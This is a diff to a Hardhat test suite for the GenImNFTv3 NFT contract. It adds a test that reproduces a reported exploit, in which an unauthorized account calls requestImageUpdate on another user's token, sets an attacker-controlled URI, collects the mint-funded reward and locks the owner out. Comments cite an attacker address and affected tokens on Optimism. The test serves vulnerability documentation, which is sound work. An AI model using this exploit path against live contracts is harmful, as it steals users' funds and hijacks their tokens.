@@ -375,6 +375,56 @@ describe("GenImNFTv3", function () {
     createWalletEnumerationTests(deployGenImNFTv3DirectFixtureViem, "GenImNFTv3"),
   );
 
+  describe("Security Vulnerabilities (Known Exploits)", function () {
+    it("Should allow unauthorized attacker to update any token and steal reward", async function () {
+      // This test documents the real exploit discovered on Nov 26, 2025
+      // Attacker address: 0x8B6B008A0073D34D04ff00210E7200Ab00003300
+      // Exploited tokens: 156, 157, etc. on Optimism mainnet
+      // Root cause: No authorization check in requestImageUpdate()
+
+      const { proxy, owner, otherAccount, thirdAccount } = await loadFixture(deployGenImNFTv3DirectFixture);
+      const mintPrice = await proxy.mintPrice();
+
+      // Step 1: Owner mints a token (simulates legitimate user)
+      await proxy.connect(owner)["safeMint(string,bool)"]("", true, { value: mintPrice });
+      const tokenId = 0n;
+
+      // Verify initial state
+      expect(await proxy.ownerOf(tokenId)).to.equal(owner.address);
+      expect(await proxy.isImageUpdated(tokenId)).to.be.false;
+
+      // Step 2: Contract has funds from mint (to pay updater)
+      const contractBalance = await hre.ethers.provider.getBalance(await proxy.getAddress());
+      expect(contractBalance).to.equal(mintPrice);
+
+      // Step 3: Attacker (unauthorized third party) watches for mint event and attacks
+      const attackerBalanceBefore = await hre.ethers.provider.getBalance(thirdAccount.address);
+
+      // THE EXPLOIT: Attacker calls requestImageUpdate without any authorization
+      const attackTx = await proxy.connect(thirdAccount).requestImageUpdate(tokenId, "ipfs://attacker-controlled-url");
+      const receipt = await attackTx.wait();
+
+      // Calculate gas cost to verify profit
+      const gasUsed = receipt!.gasUsed * receipt!.gasPrice;
+      const attackerBalanceAfter = await hre.ethers.provider.getBalance(thirdAccount.address);
+
+      // Step 4: Verify exploit succeeded
+      expect(await proxy.isImageUpdated(tokenId)).to.be.true; // Token marked as updated
+      expect(await proxy.tokenURI(tokenId)).to.equal("ipfs://attacker-controlled-url"); // Attacker controls URI
+
+      // Step 5: Verify attacker received payment (financial motivation)
+      const attackerProfit = attackerBalanceAfter - attackerBalanceBefore + BigInt(gasUsed);
+      expect(attackerProfit).to.equal(mintPrice); // Attacker stole the reward
+
+      // Step 6: Verify legitimate updater is now locked out
+      await expect(proxy.connect(owner).requestImageUpdate(tokenId, "ipfs://legitimate-url")).to.be.rejectedWith(
+        "Image already updated",
+      );
+
+      // Impact: Token is permanently locked with attacker's URL, legitimate service cannot update
+    });
+  });
+
   // Aufräumen nach jedem Test
   afterEach(function () {
     cleanupTestFiles();
